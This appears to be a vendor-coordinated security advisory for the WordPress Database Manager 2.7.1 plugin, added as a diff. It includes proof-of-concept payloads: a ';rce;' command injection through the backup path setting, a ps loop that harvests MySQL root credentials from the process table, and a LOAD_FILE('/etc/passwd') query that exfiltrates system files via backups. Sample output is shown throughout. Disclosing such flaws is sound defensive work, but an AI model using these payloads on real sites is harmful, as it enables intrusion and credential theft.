@@ -1,0 +1,172 @@
+id: 22778
+date: 10/22/2014
+title: WordPress Database Manager 2.7.1 Command Injection / Credential Leak
+author: Larry Cashdollar
+cves: CVE-2014-8334, CVE-2014-8335
+
+Title: Vulnerabilities in WordPress Database Manager v2.7.1
+Author: Larry W. Cashdollar, @_larry0
+Date: 10/13/2014
+Download: https://wordpress.org/plugins/wp-dbmanager/
+Downloads: 1,171,358
+Vendor: Lester Chan, https://profiles.wordpress.org/gamerz/
+Contacted: 10/13/2014, Vulnerabilities addressed in v2.7.2.
+Full Advisory: http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-dbmanager-2.7.1/index.html
+CVE: 2014-8334,2014-8335
+OSVDBID: 113508,113507,113509
+
+Description: "Allows you to optimize database, repair database, backup database, restore database, delete backup database , drop/empty tables and run selected queries. Supports automatic scheduling of backing up, optimizing and repairing of database."
+
+Vulnerability: Plugin suffers from command injection, exposes MySQL database credentials to the process table and allows the user to download system files via the ‘Run SQL Query’ feature. User authentication with current_user_can('manage_database')) privileges are required.  The full advisory has screen shots for illustration. 
+
+PoC
+
+Command Injection
+
+The command that is sent through passthru() is the following:
+
+
+/usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" 
+--default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db\';rce;\'/1413225588_-_wordpress.sql
+
+
+rce is just a homebrew .c binary I wrote for testing command injections it creates a file
+in /tmp with some stats on who executed it.
+
+
+# cat /tmp/RCE_JChl9c 
+ARGGHHH I've been executed! my pid is :16169 Parent id 16168 
+Name:        sh
+State:        S (sleeping)
+Tgid:        16168
+Pid:        16168
+PPid:        15925
+TracerPid:        0
+Uid:        33        33        33        33
+Gid:        33        33        33        33
+FDSize:        32
+Groups:        33 
+
+
+
+
+In the following lines commands can be injected into the variables being used to build
+the command by using ;command;
+
+
+$backup['filepath'] 
+$backup['mysqldumppath']
+
+
+I use $backup[‘filepath’] or “Path To Backup:”  for my PoC.
+
+
+/usr/share/wordpress/wp-content/backup-db;rce;
+
+
+Saving and then Running a backup executes /usr/bin/rce, the command that is sent through passthru() is the following:
+
+
+/usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" 
+--default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db;rce;/1413225588_-_wordpress.sql
+
+
+rce is just a homebrew .c binary I wrote for testing command injections, it creates a file
+in /tmp with some stats on who executed it.  
+
+
+# cat /tmp/RCE_JChl9c 
+ARGGHHH I've been executed! my pid is :16169 Parent id 16168 
+Name:        sh
+State:        S (sleeping)
+Tgid:        16168
+Pid:        16168
+PPid:        15925
+TracerPid:        0
+Uid:        33        33        33        33
+Gid:        33        33        33        33
+FDSize:        32
+Groups:        33 
+
+
+Mysql Credentials Leaked to Process Table
+
+
+Also by running a simple script:
+PoC:
+$ while (true); do  echo -n `ps ax | grep m[y]sqldump`; done
+
+
+6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db/1413224776_-_wordpress.sql 6328 ? R 0:00 sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db/1413224776_-_wordpress.sql6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db/1413224776_-_wordpress.sql 6328 ? S 0:00 /usr/bin/mysqldump --force --host=localhost --user=root --password=x xxxxxx --default-character-set=utf8 --add-drop-table --skip-lock-tables wordpress6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db/1413224776_-_wordpress.sql 6328 ? S 0:00 /usr/bin/mysqldump --force --host=localhost --user=root --password=x xxxxxx --default-character-set=utf8 --add-drop-table --skip-lock-tables wordpress
+
+
+A malicious local user can harvest credentials for the mysql database off the process table.
+
+
+The trouble is the code doesn’t properly sanitize user input and is being passed directly to passthru or system depending on which OS you’re using.
+
+
+   In wp-dbmanager.php:
+      86                 $backup['command'] = '';
+   87                 $brace = (substr(PHP_OS, 0, 3) == 'WIN') ? '"' : '';
+   88                 if(intval($backup_options['backup_gzip']) == 1) {
+   89                         $backup['filename'] = $backup['date'].'_-_'.DB_NAME.'.sql.gz';
+   90                         $backup['filepath'] = $backup['path'].'/'.$backup['filename'];
+   91                         $backup['command'] = $brace.$backup['mysqldumppath'].$brace.' --force --host="'.$backup['host'].'" --user="'.DB_USER.'" --password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].' --add-drop-table --skip-lock-tables '.DB_NAME.' | gzip > '.$brace.$backup['filepath'].$brace;
+   92                 } else {
+   93                         $backup['filename'] = $backup['date'].'_-_'.DB_NAME.'.sql';
+   94                         $backup['filepath'] = $backup['path'].'/'.$backup['filename'];
+   95                         $backup['command'] = $brace.$backup['mysqldumppath'].$brace.' --force --host="'.$backup['host'].'" --user="'.DB_USER.'" --password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].' --add-drop-table --skip-lock-tables '.DB_NAME.' > '.$brace.$backup['filepath'].$brace;
+   96                 }
+   97                 execute_backup($backup['command']);
+
+
+
+  211 ### Executes OS-Dependent mysqldump Command (By: Vlad Sharanhovich)
+  212 function execute_backup($command) {
+  213         $backup_options = get_option('dbmanager_options');
+  214         check_backup_files();
+  215         if(substr(PHP_OS, 0, 3) == 'WIN') {
+  216                 $writable_dir = $backup_options['path'];
+  217                 $tmpnam = $writable_dir.'/wp-dbmanager.bat';
+  218                 $fp = fopen($tmpnam, 'w');
+  219                 fwrite($fp, $command);
+  220                 fclose($fp);
+  221                 system($tmpnam.' > NUL', $error);
+  222                 unlink($tmpnam);
+  223         } else {
+  224                 passthru($command, $error);
+  225         }
+  226         return $error;
+  227 }
+
+
+In database-manage.php: 
+      46                                 if(stristr($database_file, '.gz')) {
+   47                                         $backup['command'] = 'gunzip < '.$brace.$backup['path'].'/'.$database_file.$brace.' | '.$brace.$backup['mysqlpath'].$brace.' --host="'.$backup['host'].'" --user="'.DB_USER.'" --password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].$backup['charset'].' '.DB_NAME;
+   48                                 } else {
+   49                                         $backup['command'] = $brace.$backup['mysqlpath'].$brace.' --host="'.$backup['host'].'" --user="'.DB_USER.'" --password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].$backup['charset'].' '.DB_NAME.' < '.$brace.$backup['path'].'/'.$database_file.$brace;
+   50                                 }
+   51                                 passthru($backup['command'], $error);
+
+
+
+
+File Downloads
+In the ‘Sql Run Query’ Panel only a few queries are allowed (Use Only INSERT, UPDATE, REPLACE, DELETE, CREATE and ALTER statements.) but these are suffiecient to download sensitive system files:
+CREATE TABLE password (passwords varchar(8096));
+
+
+INSERT into password (passwords) VALUES(LOAD_FILE(‘/etc/passwd’));
+
+
+Then run a database backup, and download the backup file or send via email. 
+
+
+From 1413409573_-_wordpress.sql:
+
+
+INSERT INTO `password` VALUES ('root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\nDebian-exim:x:101:104::/var/spool/exim4:/bin/false\nstatd:x:102:65534::/var/lib/nfs:/bin/false\nsshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin\npostgres:x:104:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nlarry:x:1000:1000:larry,,,:/home/larry:/bin/bash\nmysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false\nmessagebus:x:106:110::/var/run/dbus:/bin/false\n');
+/*!40000 ALTER TABLE `password` ENABLE KEYS */;
+
+#  0day.today [2023-03-23]  #
